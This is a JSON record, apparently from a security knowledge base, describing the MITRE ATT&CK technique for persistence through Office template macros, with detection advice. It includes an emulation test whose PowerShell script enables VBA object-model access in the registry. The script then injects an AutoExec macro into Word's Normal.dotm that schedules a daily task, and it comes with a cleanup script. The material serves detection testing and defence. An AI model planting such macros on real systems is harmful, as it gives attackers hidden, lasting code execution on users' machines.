{
    "id": "T1137.001",
    "name": "Office Template Macros",
    "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019)\nWord Normal.dotm location:\n`C:Users&lt;username&gt;AppDataRoamingMicrosoftTemplatesNormal.dotm`\nExcel Personal.xlsb location:\n`C:Users&lt;username&gt;AppDataRoamingMicrosoftExcelXLSTARTPERSONAL.XLSB`\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under `C:Program Files (x86)Microsoft OfficerootOffice16`, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019)\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
    "platforms": "Windows, Office 365",
    "kill_chain_phases": "Persistence",
    "data_sources": "Process: Process Creation, Command: Command Execution, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification, File: File Creation, File: File Modification",
    "detection": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)",
    "url": "https://attack.mitre.org/techniques/T1137/001",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "79a47ad0-fc3b-4821-9f01-a026b1ddba21"
                ],
                "lookup_results": [
                    {
                        "uuid": "79a47ad0-fc3b-4821-9f01-a026b1ddba21",
                        "lookup_data": {
                            "mitre-attack-id": "T1137.001",
                            "mitre-cti:description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
                            "mitre-cti:name": "Office Template Macros",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows', 'Office 365'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21', 'type': 'attack-pattern', 'created': '2019-11-07T20:29:17.788Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1137.001', 'url': 'https://attack.mitre.org/techniques/T1137/001'}, {'url': 'https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea', 'description': 'Microsoft. (n.d.). Change the Normal template (Normal.dotm). Retrieved July 3, 2017.', 'source_name': 'Microsoft Change Normal Template'}, {'url': 'https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office', 'description': 'Austin, J. (2017, June 6). Getting Started with VBA in Office. Retrieved July 3, 2017.', 'source_name': 'MSDN VBA in Office'}, {'url': 'https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/', 'description': 'Nelson, M. (2014, January 23). Maintaining Access with normal.dotm. Retrieved July 3, 2017.', 'source_name': 'enigma0x3 normal.dotm'}, {'url': 'http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/', 'description': 'Hexacorn. (2017, April 17). Beyond good olâ€™ Run key, Part 62. Retrieved July 3, 2017.', 'source_name': 'Hexacorn Office Template Macros'}, {'source_name': 'GlobalDotName Jun 2019', 'url': 'https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique', 'description': 'Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.'}, {'source_name': 'CrowdStrike Outlook Forms', 'url': 'https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746', 'description': 'Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.'}, {'source_name': 'Outlook Today Home Page', 'url': 'https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943', 'description': 'Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.'}], 'modified': '2021-08-16T21:27:10.873Z', 'name': 'Office Template Macros', 'description': \"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\\n\\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \\n\\nWord Normal.dotm location:<br>\\n<code>C:\\\\Users\\\\&lt;username&gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\Normal.dotm</code>\\n\\nExcel Personal.xlsb location:<br>\\n<code>C:\\\\Users\\\\&lt;username&gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\XLSTART\\\\PERSONAL.XLSB</code>\\n\\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Office16\\\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \\n\\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}], 'x_mitre_detection': 'Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Modification', 'Command: Command Execution', 'File: File Modification', 'File: File Creation', 'Process: Process Creation', 'Windows Registry: Windows Registry Key Creation'], 'x_mitre_permissions_required': ['User', 'Administrator']}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1137.001",
                "display_name": "Office Application Startup: Office Template Macros.",
                "atomic_tests": [
                    {
                        "name": "Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell",
                        "auto_generated_guid": "940db09e-80b6-4dd0-8d4d-7764f89b47a8",
                        "description": "Injects a Macro in the Word default template \"Normal.dotm\" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependencies": [
                            {
                                "description": "Microsoft Word must be installed\n",
                                "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\n",
                            "cleanup_command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:34:33"
}